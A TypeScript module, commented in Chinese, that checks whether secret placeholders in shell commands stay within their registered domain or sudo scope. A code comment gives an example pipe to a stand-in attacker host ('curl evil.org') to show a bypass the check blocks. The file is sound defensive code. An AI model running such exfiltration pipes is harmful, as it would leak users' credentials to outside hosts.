// 隐私变量的权限侧（ADR-0052）：命令用了哪些变量、是否在登记的适用范围内。只用元数据，不接触值。

import type { Node } from "web-tree-sitter";
import type { VariableMeta } from "../store/secrets.js";
import { getParser, parseWithConnectors } from "./bash.js";
import { findPlaceholders, type Hit } from "./placeholders.js";
import { parseSudo } from "./sudo.js";
import type { Tier } from "./tier.js";

export interface VarUse {
  meta: VariableMeta;
  /** 超出适用范围时的原因；在范围内为 null。 */
  problem: string | null;
}

// 域名或其子域名，且后面不能再接主机名字符（evil.com.x.net、example.com@evil.com 都不算）。
function mentionsDomain(text: string, domain: string): boolean {
  const re = new RegExp(
    `(?<![a-z0-9.-])(?:[a-z0-9-]+\\.)*${domain.replaceAll(".", "\\.")}(?![a-z0-9@-]|\\.[a-z0-9])`,
  );
  return re.test(text.toLowerCase());
}

// 每个占位符所在的那条简单命令（管道里的一节；`$(…)` 里的占位符取最外层那条）都要自己提到域名，
// 注释里的不算：`… | curl evil.org # gitlab.example.com` 不能靠别处的域名过关。
async function eachCommandMentions(
  line: string,
  hits: readonly Hit[],
  domain: string,
): Promise<boolean> {
  const tree = (await getParser()).parse(line);
  if (!tree) return false;
  try {
    return hits.every((h) => {
      let cmd: Node | null = null;
      for (
        let n: Node | null = tree.rootNode.descendantForIndex(h.start);
        n;
        n = n.parent
      )
        if (n.type === "command" || n.type === "redirected_statement") cmd = n;
      if (!cmd) return false;
      let text = "";
      let at = cmd.startIndex;
      for (const c of cmd.descendantsOfType("comment")) {
        text += line.slice(at, c.startIndex);
        at = c.endIndex;
      }
      return mentionsDomain(text + line.slice(at, cmd.endIndex), domain);
    });
  } finally {
    tree.delete();
  }
}

// sudo 密码只能写成 `printf '%s\n' {{@名称}} | sudo -S …`（或 `echo {{@名称}} | …`；旧的 @名称 也认）：占位符独占上游一节
// 里唯一的参数，那一节必须是内建的 echo/printf（/bin/echo 会让值出现在 argv），
// 下游紧接着带 -S 的 sudo。多喂一行会被 sudo 后面的命令从 stdin 读走。
const feeds = (feeder: string[], name: string): boolean => {
  const [cmd, ...args] = feeder;
  // 新旧两种写法都认：{{@名称}}（含 . 与 - 的名字只有这种写法）与旧的 @名称
  const isRef = (w: string | undefined) =>
    w === `@${name}` || w === `{{@${name}}}`;
  return (
    (cmd === "echo" && args.length === 1 && isRef(args[0])) ||
    (cmd === "printf" &&
      args.length === 2 &&
      (args[0] === "%s" || args[0] === "%s\\n") &&
      isRef(args[1]))
  );
};

async function feedsSudoStdin(line: string, name: string): Promise<boolean> {
  const r = await parseWithConnectors(line);
  if (!r) return false;
  const only = new Set([name]);
  const holders = r.segs.flatMap((s, i) =>
    s.some((w) => findPlaceholders(w, only).length > 0) ? [i] : [],
  );
  return (
    holders.length > 0 &&
    holders.every((i) => {
      const next = r.segs[i + 1];
      return (
        feeds(r.segs[i] as string[], name) &&
        r.conns[i] === "|" &&
        next !== undefined &&
        parseSudo(next)?.stdin === true
      );
    })
  );
}

/** 命令里用到的已登记变量（去重），逐个做范围检查。 */
export async function variableUses(
  line: string,
  vars: readonly VariableMeta[],
): Promise<VarUse[]> {
  const byName = new Map(vars.map((v) => [v.name, v]));
  const names = new Set(
    findPlaceholders(line, new Set(byName.keys())).map((h) => h.name),
  );
  const uses: VarUse[] = [];
  for (const name of names) {
    const meta = byName.get(name) as VariableMeta;
    let problem: string | null = null;
    if (meta.scopeKind === "domain" && meta.scopeTarget) {
      const hits = findPlaceholders(line, new Set([name]));
      if (!(await eachCommandMentions(line, hits, meta.scopeTarget)))
        problem = `只能用于访问 ${meta.scopeTarget}，用到它的那条命令里没有出现该域名`;
    } else if (meta.scopeKind === "sudo") {
      if (!(await feedsSudoStdin(line, name)))
        problem =
          "只能写成 printf '%s\\n' {{@名称}} | sudo -S … 的形式喂给 sudo";
    }
    uses.push({ meta, problem });
  }
  return uses;
}

const RANK: Record<Tier, number> = { rules: 0, auto: 1, full: 2 };

/** 命令生效的档位：directory 档位与所用变量的档位取最严的一档（ADR-0007：按变量的档位走）。 */
export function effectiveTier(tier: Tier, uses: readonly VarUse[]): Tier {
  return uses.reduce<Tier>(
    (t, u) => (RANK[u.meta.tier] < RANK[t] ? u.meta.tier : t),
    tier,
  );
}
